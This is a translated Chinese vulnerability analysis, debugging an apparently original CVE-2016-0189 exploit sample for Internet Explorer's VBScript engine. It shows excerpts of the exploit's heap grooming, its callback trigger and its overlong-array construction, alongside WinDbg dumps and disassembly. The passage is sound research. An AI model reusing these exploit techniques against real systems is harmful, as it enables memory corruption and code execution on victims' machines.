# 对疑似CVE-2016-0189原始攻击样本的调试
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
去年`10`月底，我得到一个与大众视野中不太一样的`CVE-2016-0189`利用样本。初步分析后，我觉得着这应该是当年`CVE-2016-0189`的原始攻击文件。其混淆手法和后续出现的`CVE-2017-0149`、`CVE-2018-8174`、`CVE-2018-8373`完全一致。其利用及加载`shellcode`的手法也都和后面几个利用一致。
当时我手头有其他事情，并未对该样本进行仔细研究。几天前，我重新翻出了相关样本进行了一番调试。
本文我将描述该`CVE-2016-0189`样本的利用方式，读者在后面将会看到，利用过程中的错位手法和`CVE-2014-6332`，`CVE-2017-0149`，`CVE-2018-8174`以及`CVE-2018-8373`几乎一致。
之前大众视野中的`CVE-2016-0189`样本，基本都是参考[这篇文章](https://theori.io/research/cve-2016-0189)中公开的代码，关于这份公开代码的利用细节，我在[之前的文章](https://bbs.pediy.com/thread-228371.htm)已有详细分析。
下面我们来一窥`3`年前`CVE-2016-0189`实际`0day`样本的利用手法。
## 内存布局
原样本中借助如下代码进入利用函数
    document.write(" var obj = {}; obj.toString = function() { my_valueof(); return 0;}; StartExploit(obj); " &Unescape("%3c/script%3e"))
在`StartExploit`函数中，首先调用`prepare`函数进行内存布局。每次执行`arr2(i) =
Null`会导致一个`tagSAFEARRAY`结构体内存被回收。
    ReDim arr(0, 0)
    arr(0, 0) = 3 '这一步很重要，数字3在错位后会被解释为vbLong类型
    ...
    Sub prepare
        Dim arr5()
        ReDim arr5(2)
        For i = 0 To 17
            arr3(i) = arr5
        Next
        For i = 0 To &h7000
            arr1(i) = arr
        Next
        For i = 0 To 1999
            arr2(i) = arr '将 arr2 的每个成员初始化为一个数组
        Next
        For i = 1000 To 100 Step -3
            arr2(i)(0, 0) = 0 
            arr2(i) = Null '释放 arr2(100) ~ arr2(1000) 之间 1/3 的元素
        Next
        ReDim arr4(0, &hFFF) '定义 arr4
    End Sub
    Function StartExploit(js_obj)
        '省略无关代码
        prepare
        arr4(js_obj, 6) = &h55555555
        For i = 0 To 1999
            If IsArray(arr2(i)) = True Then
                If UBound(arr2(i), 1) > 0 Then
                    vul_index = i
                    Exit For
                End If
            End If
        Next
        lb_index = LBound(arr2(i), 1)
        If prepare_rw_mem() = True Then
        Else
            Exit Function
        End If
        addr = leak_addr()
        '省略后续代码
    End Function
每个`tagSAFEARRAY`在内存中占据的大小为`0x30`字节，其中后`0x20`字节存储着`tagSAFEARRAY`的实际数据。
    0:015> !heap -p -a 052a9fb0
        address 052a9fb0 found in
        _HEAP @ 360000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            052a9f98 0007 0000  [00]   052a9fa0    00030 - (busy)
    0:015> dd 052a9fa0 l30/4
    052a9fa0  00000000 00000000 00000000 0000000c
    052a9fb0  08800002 00000010 00000000 0529d640
    052a9fc0  00000001 00000000 00000001 00000000
    0:015> dt ole32!tagSAFEARRAY 052a9fb0  
       +0x000 cDims            : 2
       +0x002 fFeatures        : 0x880
       +0x004 cbElements       : 0x10
       +0x008 cLocks           : 0
       +0x00c pvData           : 0x0529d640 
       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
整个释放过程造成大约`300`个`0x30`大小的内存空洞。
## 触发漏洞
内存布局完毕后，利用代码通过`arr4(js_obj, 6) =
&h55555555`这一操作进入自定义的`my_valueof`回调函数，然后在回调函数中重新定义`arr4`。这导致`arr4`对应的原`pvData`内存被释放，并按照所需大小申请新的内存。
    Sub my_valueof()
        ReDim arr4(2, 0)
    End Sub
上述语句将导致`arr4(2,
0)`对应的`pvData`去申请一块大小为`0x30`的内存，借助相关内存的分配特性，此过程会重用某块刚才释放的`tagSAFEARRAY`内存。
我们来仔细看一下`arr4(js_obj, 6) = &h55555555`语句的执行逻辑。
`CVE-2016-0189`的成因在于`AccessArray`中遇到`javascript`对象后可以导致一个对重载函数的回调`my_valueof`，利用代码在`my_valueof`将`arr4`重新定义为`arr4(2,
0)`，当回调完成再次返回到`AccessArray`时，`arr4`相关的`tagSAFEARRAY`结构体和`pvData`指针均已被修改，而`AccessArray`会继续往下执行的时候仍然按照arr4(0,
6)在计算元素地址，并将计算得到的地址保存到一个栈变量上。
以下汇编代码为`vbscript!CScriptRuntime::RunNoEH`函数先后调用`AccessArray`和`AssignVar`的代码片段，此处`AccessArray`返回的元素地址会保存到一个栈变量`[ebp-1Ch]`上，`RunNoEH`随后会从栈上获取该变量，赋值给`edx`，并在调用`AssignVar`时作为目的地址使用。
    6d767679 8b55d8          mov     edx,dword ptr [ebp-28h]
    6d76767c 8d4de4          lea     ecx,[ebp-1Ch] ; ebp-1Ch 是一个栈上的变量，AccessArray 访问到的具体地址会存放到这个变量里面
    6d76767f 6a00            push    0
    6d767681 ffb3b0000000    push    dword ptr [ebx+0B0h]
    6d767687 56              push    esi
    6d767688 e886feffff      call    vbscript!AccessArray (6d767513)
    6d76768d 8945f8          mov     dword ptr [ebp-8],eax
    6d767690 85c0            test    eax,eax
    6d767692 0f888ebe0200    js      vbscript!CScriptRuntime::RunNoEH+0x40db7 (6d793526)
    6d767698 8b83b0000000    mov     eax,dword ptr [ebx+0B0h]
    6d76769e 8b55e4          mov     edx,dword ptr [ebp-1Ch] ss:0023:02c1bd98=0253a2c0 ; 将 ebp-1Ch 变量保存到edx
    6d7676a1 8b0b            mov     ecx,dword ptr [ebx] 
    6d7676a3 c1e604          shl     esi,4
    6d7676a6 6a01            push    1
    6d7676a8 03c6            add     eax,esi
    6d7676aa 50              push    eax
    6d7676ab e8cab8feff      call    vbscript!AssignVar (6d752f7a)
## 构造超长数组
通过上述步骤，`&h55555555`对应的`tagVARIANT`被写入某个属于`arr2(i)`的`tagSAFEARRAY`结构体。从而获得一个可以用来越界读写的二维数组。
###  在调试器中看超长数组
我们先来看一下`arr2(i) = Null`操作全部结束的`arr2`。
    // arr2 tagSAFEARRAY
    0:007> dd 034a8d90 l6
    034a8d90  08920001 00000010 00000000 0506c060
    034a8da0  000007d0 00000000
    // arr2 tagSAFEARRAY.pvData
    0:007> dd 0506c060
    0506c060  0288200c 02888208 052a8848 00000002
    0506c070  0288200c 02888208 052a8880 00000002
    0506c080  0288200c 02888208 052a88b8 00000002
    0506c090  0288200c 02888208 052a88f0 00000002
    0506c0a0  0288200c 02888208 052a8928 00000002
    0506c0b0  0288200c 02888208 052a8960 00000002
    0506c0c0  0288200c 02888208 052a8998 00000002
    0506c0d0  0288200c 02888208 052a89d0 00000002
    // arr2(100) 开始的数据
    0:015> dd 0506c060 + 0n100*10 l4*20
    0506c6a0  00000001 00000000 00000000 00000000
    0506c6b0  0288200c 02888208 052a9e60 00000002
    0506c6c0  0288200c 02888208 052a9e98 00000002
    0506c6d0  00000001 00000000 00000000 00000000 // 052a9ed0 原先位于这里
    0506c6e0  0288200c 02888208 052a9f08 00000002